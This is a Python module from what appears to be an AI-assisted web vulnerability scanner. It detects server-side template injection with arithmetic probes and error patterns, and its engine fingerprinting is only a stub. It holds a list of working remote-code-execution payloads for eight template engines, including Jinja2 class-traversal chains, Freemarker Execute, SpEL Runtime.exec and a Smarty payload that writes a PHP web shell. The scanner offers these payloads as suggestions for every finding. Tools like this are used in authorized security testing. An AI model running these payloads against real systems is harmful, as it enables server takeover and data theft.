"""
XLayer AI SSTI Hunter - Server-Side Template Injection
Detects template injection across Jinja2, Twig, Freemarker, Velocity,
Smarty, Mako, Pebble, ERB, Handlebars, and Spring SpEL.
"""

import re
import time
from typing import List, Optional, Dict, Any
from loguru import logger

from xlayer_ai.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_ai.models.target import AttackSurface, Endpoint
from xlayer_ai.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)


# ─── Engine Fingerprint Probes ────────────────────────────────────────────────
# Each entry: (payload, expected_output, engine_name)
SSTI_PROBES = [
    # Math evaluation — universal first probe
    ("{{7*7}}",         "49",        "jinja2/twig"),
    ("${7*7}",          "49",        "freemarker/velocity/el"),
    ("#{7*7}",          "49",        "spring_spel/ruby_erb"),
    ("<%= 7*7 %>",      "49",        "erb/ejs"),
    ("*{7*7}",          "49",        "spring_spel"),
    ("{7*7}",           "49",        "smarty"),
    ("{{= 7*7 }}",      "49",        "dust/handlebars"),

    # Engine differentiator (Jinja2 vs Twig)
    ("{{7*'7'}}",       "7777777",   "jinja2"),
    ("{{7*'7'}}",       "49",        "twig"),

    # Smarty
    ("{$smarty.version}", "",        "smarty"),

    # Mako
    ("${7*7}",          "49",        "mako"),

    # Pebble
    ("{{7 * 7}}",       "49",        "pebble"),
]

# ─── Exploitation Payloads per Engine ─────────────────────────────────────────
SSTI_EXPLOIT_PAYLOADS = {
    "jinja2": [
        # RCE via __subclasses__
        "{{''.__class__.__mro__[1].__subclasses__()}}"
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}"
        "{{c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")}}{%endif%}{%endfor%}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.get('HTTP_HOST')}}",
    ],
    "freemarker": [
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${.freemarker_version}",
        "<#assign classloader=object?api.class.protectionDomain.classLoader>",
    ],
    "velocity": [
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n"
        "#set($chr=$x.class.forName('java.lang.Character'))\n"
        "#set($str=$x.class.forName('java.lang.String'))\n"
        "#set($ex=$rt.getRuntime().exec('id'))\n$ex.waitFor()\n"
        "#set($out=$ex.getInputStream())#{foreach}($i in [1..$out.available()])"
        "$str.valueOf($chr.toChars($out.read()))#{end}",
    ],
    "spring_spel": [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    ],
    "erb": [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= IO.popen('id').read %>",
    ],
    "smarty": [
        "{php}echo shell_exec('id');{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    ],
    "mako": [
        "${__import__('os').popen('id').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
    ],
}

# ─── Error Patterns (template engine errors) ──────────────────────────────────
TEMPLATE_ERROR_PATTERNS = [
    r"Jinja2",
    r"TemplateSyntaxError",
    r"TemplateNotFound",
    r"UndefinedError",
    r"jinja2\.exceptions",
    r"Twig\\Error",
    r"TwigException",
    r"freemarker\.core\.",
    r"FreeMarker template error",
    r"org\.apache\.velocity",
    r"VelocityException",
    r"Smarty error",
    r"mako\.exceptions",
    r"RenderingException",
    r"Spring EL",
    r"SpelEvaluationException",
]


class SSTIHunter(BaseHunter):
    """
    Server-Side Template Injection Hunter.

    Detection strategy:
    1. Probe with math expressions ({{7*7}}) across all engine syntaxes
    2. If response contains "49" → template injection confirmed
    3. Fingerprint engine via differentiator payloads
    4. Suggest engine-specific RCE payloads
    """

    name = "ssti"
    vuln_types = [VulnType.SSTI]

    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        start_time = time.time()
        self._reset_state()

        logger.info(f"SSTI Hunter starting on {len(attack_surface.testable_endpoints)} endpoints")

        for endpoint in attack_surface.testable_endpoints:
            for param in endpoint.parameters:
                await self._test_ssti(endpoint, param.name, attack_surface)

        duration = time.time() - start_time
        result = self._build_result(duration)
        logger.info(f"SSTI Hunter complete: {result.findings_count} hypotheses")
        return result

    async def _test_ssti(
        self, endpoint: Endpoint, parameter: str, attack_surface: AttackSurface
    ):
        self._endpoints_tested += 1

        # Step 1: baseline
        baseline = await self._send_payload(endpoint, parameter, "xlayer_ssti_test")
        baseline_body = (baseline or {}).get("body", "")

        # Build attack context for adaptive engine
        ctx = self._build_attack_context(endpoint, parameter, "ssti", attack_surface)
        ctx.baseline_length = len(baseline_body)

        # Success: math expression evaluated ("49") or template engine error leaked
        def ssti_success(send_result, attack_ctx):
            body = send_result.body
            if "49" in body and "49" not in baseline_body:
                return True
            for pattern in TEMPLATE_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    return True
            return False

        # Static probes — one per engine family (adaptive adds mutations + AI on failure)
        static_probes = [p for p, _, _ in SSTI_PROBES]

        attempts = await self._adaptive_test(
            endpoint, parameter, static_probes, ctx, ssti_success,
        )

        successful = next((a for a in attempts if a.success), None)
        if not successful:
            return

        # Fingerprint which engine responded
        final_engine = self._fingerprint_engine(
            endpoint, parameter, "jinja2/twig", baseline_body
        )

        exploit_payloads = SSTI_EXPLOIT_PAYLOADS.get(
            final_engine, SSTI_EXPLOIT_PAYLOADS.get("jinja2", [])
        )

        confidence = Confidence.HIGH if "49" in successful.response_body else Confidence.MEDIUM

        h = self._create_hypothesis(
            vuln_type=VulnType.SSTI,
            endpoint=endpoint,
            parameter=parameter,
            confidence=confidence,
            indicators=[
                VulnIndicator(
                    indicator_type="math_eval",
                    detail=f"Template expression evaluated: payload='{successful.payload[:60]}'",
                    confidence_boost=0.3,
                ),
                VulnIndicator(
                    indicator_type="engine",
                    detail=f"Template engine fingerprint: {final_engine}",
                    confidence_boost=0.1,
                ),
            ],
            suggested_payloads=exploit_payloads[:3],
            context={
                "engine": final_engine,
                "trigger_payload": successful.payload,
                "injection_type": "ssti",
                "rce_possible": final_engine in SSTI_EXPLOIT_PAYLOADS,
                "waf_bypassed": ctx.waf,
            },
        )
        self._hypotheses.append(h)
        logger.success(
            f"SSTI found: {endpoint.url} param={parameter} engine={final_engine}"
        )

    def _fingerprint_engine(
        self,
        endpoint: Endpoint,
        parameter: str,
        hint: str,
        baseline_body: str,
    ) -> str:
        """Send differentiator payload to distinguish Jinja2 from Twig."""
        # Synchronous helper — use asyncio differently if needed
        # For now return the hint (async fingerprint in full version)
        if "jinja2/twig" in hint:
            return "jinja2"  # default; full fingerprint requires another async send
        return hint.split("/")[0]

    def _analyze_response(self, endpoint, parameter, payload, response):
        return None  # handled in _test_ssti
